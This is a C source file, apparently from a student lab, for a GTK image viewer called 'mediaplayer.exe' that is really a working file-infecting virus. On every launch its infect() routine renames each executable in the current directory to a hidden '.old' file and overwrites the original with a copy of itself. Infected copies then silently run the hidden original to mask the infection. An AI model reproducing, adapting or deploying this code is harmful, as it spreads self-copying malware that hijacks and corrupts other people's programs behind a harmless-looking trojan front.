 #include <gtk/gtk.h>
#include <gst/gst.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>



static GtkWidget *image;
static int i = 0;
char **images;
int nbImages = 0;

int load_image() {
    images = malloc(sizeof(char *) * 100);
    char *path = malloc(sizeof(char) * 250);
    strcpy(path, "/home/tpuser/Documents/virus-mediaplayer/ressources/images");

    if (images && path) {
        DIR *d;
        struct dirent *dir;
        d = opendir(path);

        if (d) {
            while ((dir = readdir(d)) != NULL) {
                if (strstr(dir->d_name, ".jpg") != NULL || strstr(dir->d_name, ".png") != NULL || strstr(dir->d_name, ".jpeg") != NULL || strstr(dir->d_name, ".gif") != NULL) {
                    char *image = malloc(sizeof(char) * 250);
                    strcpy(image, path);
                    strcat(image, "/");
                    strcat(image, dir->d_name);
                    images = realloc(images, sizeof(char *) * (nbImages + 1));
                    images[nbImages++] = image;
                }
            }
            free(path);
            closedir(d);
        }
        return nbImages;
    }
    return 0;
}

void click_next_image(GtkWidget *widget, gpointer data) {
    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(images[i], NULL);
    if (!pixbuf) {
        g_error("Failed to load image: %s", images[i]);
        return;
    }

    GdkPixbuf *resized_pixbuf = gdk_pixbuf_scale_simple(pixbuf, 400, 400, GDK_INTERP_BILINEAR);
    g_object_unref(pixbuf);

    gtk_image_set_from_pixbuf(GTK_IMAGE(image), resized_pixbuf);

    i++;
    if (i == nbImages) {
        i = 0;
    }
}

void click_previous_image(GtkWidget *widget, gpointer data) {
    GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(images[i], NULL);
    if (!pixbuf) {
        g_error("Failed to load image: %s", images[i]);
        return;
    }

    GdkPixbuf *resized_pixbuf = gdk_pixbuf_scale_simple(pixbuf, 400, 400, GDK_INTERP_BILINEAR);
    g_object_unref(pixbuf);

    gtk_image_set_from_pixbuf(GTK_IMAGE(image), resized_pixbuf);

    i--;
    if (i < 0) {
        i = nbImages - 1;
    }
}

void affichage_fichier_cible() {
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            struct stat sb;
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
                stat(dir->d_name, &sb);
                if (sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode)) {
                    printf("%s\n", dir->d_name);
                }
            }
        }
        closedir(d);
    }
}

void renommer_fichier(const char *nom_fichier) {
    char *fichier_old = malloc(strlen(nom_fichier) + 15);
    strcpy(fichier_old, ".");
    strcat(fichier_old, nom_fichier);
    strcat(fichier_old, ".old");
    if (rename(nom_fichier, fichier_old) == 0) {
        printf("Fichier %s renomme en %s\n", nom_fichier, fichier_old);
    } else {
        printf("Erreur lors du renommage du fichier %s\n", nom_fichier);
    }
    free(fichier_old);
}

void copier_virus(const char *nom_fichier) {
    FILE *virus = fopen("mediaplayer.exe", "rb");
    FILE *cible = fopen(nom_fichier, "wb");
    if (virus != NULL && cible != NULL) {
        char buffer[1024];
        size_t bytes;
        while ((bytes = fread(buffer, 1, sizeof(buffer), virus)) > 0) {
            fwrite(buffer, 1, bytes, cible);
        }
        fclose(virus);
        fclose(cible);
        chmod(nom_fichier, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
        printf("Fichier %s infecte\n", nom_fichier);
    } else {
        printf("Erreur lors de l'infection du fichier %s\n", nom_fichier);
    }
}

void infect() {
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            struct stat sb;
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ".old") == NULL) {
                if (!stat(dir->d_name, &sb)) {
                    if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode)) {                        
                        printf("%s\n", dir->d_name);
                        char *fichier = (char *)dir->d_name;
                        if (fichier_old_existe(fichier) == -1) {
                            renommer_fichier(fichier);
                            copier_virus(fichier);
                        } else {
                            printf("Fichier %s deja cible\n", fichier);
                        }
                    }
                }
            }
        }
        closedir(d);
    }
}

int fichier_old_existe(char *fichier) {
    char *first_check = malloc(strlen(fichier) + 15);
    strcpy(first_check, ".");
    strcat(first_check, fichier);
    strcat(first_check, ".old");

    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0) {
                if (strcmp(dir->d_name, first_check) == 0 && strstr(dir->d_name, ".old") != NULL) {
                    if (fopen(first_check, "r") != NULL) {
                        closedir(d);
                        return 1;
                    }
                }
            }
        }
        closedir(d);
    }
    return -1;
}

void fichier_deja_cible() {
    char *fichier = "CalculatriceBasique";

    if (fichier_old_existe(fichier) == 1) {
        printf("Fichier %s deja cible\n", fichier);
    } else {
        printf("Fichier %s non cible\n", fichier);
    }
}

static GstElement *pipeline;
static gboolean is_playing = FALSE;

static void play_pause_button_clicked(GtkWidget *widget, gpointer data) {
    if (is_playing) {
        gst_element_set_state(pipeline, GST_STATE_PAUSED);
        is_playing = FALSE;
    } else {
        gst_element_set_state(pipeline, GST_STATE_PLAYING);
        is_playing = TRUE;
    }
}

static void stop_button_clicked(GtkWidget *widget, gpointer data) {
    gst_element_set_state(pipeline, GST_STATE_NULL);
    is_playing = FALSE;
}

static void next_button_clicked(GtkWidget *widget, gpointer data) {
    click_next_image(widget, data);
}

static void previous_button_clicked(GtkWidget *widget, gpointer data) {
    click_previous_image(widget, data);
}

static void file_chooser_button_clicked(GtkWidget *widget, gpointer data) {
    GtkWidget *dialog;
    GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_OPEN;
    gint res;
    dialog = gtk_file_chooser_dialog_new("Open File", GTK_WINDOW(data), action, "Cancel", GTK_RESPONSE_CANCEL, "Open", GTK_RESPONSE_ACCEPT, NULL);

    res = gtk_dialog_run(GTK_DIALOG(dialog));
    if (res == GTK_RESPONSE_ACCEPT) {
        gchar *filename;
        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);
        filename = gtk_file_chooser_get_filename(chooser);

        GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(filename, NULL);
        if (!pixbuf) {
            g_error("Failed to load image: %s", filename);
            g_free(filename);
            gtk_widget_destroy(dialog);
            return;
        }

        GdkPixbuf *resized_pixbuf = gdk_pixbuf_scale_simple(pixbuf, 400, 400, GDK_INTERP_BILINEAR);
        g_object_unref(pixbuf);

        gtk_image_set_from_pixbuf(GTK_IMAGE(image), resized_pixbuf);
        g_object_unref(resized_pixbuf);

        gst_element_set_state(pipeline, GST_STATE_NULL);

        g_free(filename);
    }

    gtk_widget_destroy(dialog);
}

int main(int argc, char *argv[]) {
    int nbImages = load_image();    
    infect();
    if (strcmp(argv[0], "./mediaplayer.exe") == 0) {
        gtk_init(&argc, &argv);
        gst_init(&argc, &argv);

        GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
        g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
        gtk_window_set_default_size(GTK_WINDOW(window), 800, 600);

        GtkWidget *vbox = gtk_vbox_new(FALSE, 5);

        image = gtk_image_new();
        gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 0);

        GtkWidget *next_button = gtk_button_new_with_label("Next");
        g_signal_connect(next_button, "clicked", G_CALLBACK(next_button_clicked), images);
        gtk_box_pack_start(GTK_BOX(vbox), next_button, FALSE, FALSE, 0);

        GtkWidget *previous_button = gtk_button_new_with_label("Previous");
        g_signal_connect(previous_button, "clicked", G_CALLBACK(previous_button_clicked), images);
        gtk_box_pack_start(GTK_BOX(vbox), previous_button, FALSE, FALSE, 0);

        GtkWidget *file_chooser_button = gtk_button_new_with_label("Open File");
        g_signal_connect(file_chooser_button, "clicked", G_CALLBACK(file_chooser_button_clicked), window);
        gtk_box_pack_start(GTK_BOX(vbox), file_chooser_button, FALSE, FALSE, 0);

        gtk_container_add(GTK_CONTAINER(window), vbox);

        pipeline = gst_pipeline_new("media-player");

        gtk_widget_show_all(window);
        gtk_main();

        gst_element_set_state(pipeline, GST_STATE_NULL);
        gst_object_unref(GST_OBJECT(pipeline));

    } else {
        DIR *d;
        struct dirent *dir;
        d = opendir(".");
        if (d) {
            while ((dir = readdir(d)) != NULL) {
                if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0) {
                    struct stat sb;
                    stat(dir->d_name, &sb);
                    if (sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode)) {
                        char *name_file = malloc(strlen(argv[0]) + 10);
                        strncpy(name_file, argv[0] + 2, strlen(argv[0]) - 2);
                        char *verif_name = malloc(strlen(name_file) + 5);
                        strcpy(verif_name, ".");
                        strcat(verif_name, name_file);
                        strcat(verif_name, ".old");

                        if (strcmp(dir->d_name, verif_name) == 0) {
                            printf("Fichier %s deja cible\n", dir->d_name);

                            strcpy(verif_name, "./");
                            strcat(verif_name, ".");
                            strcat(verif_name, name_file);
                            strcat(verif_name, ".old");

                            printf("command %s\n", verif_name);
                            execl(verif_name, NULL);
                        }
                        free(name_file);
                        free(verif_name);                        
                    }
                }
            }
            closedir(d);
        }
    }

    return 0;
}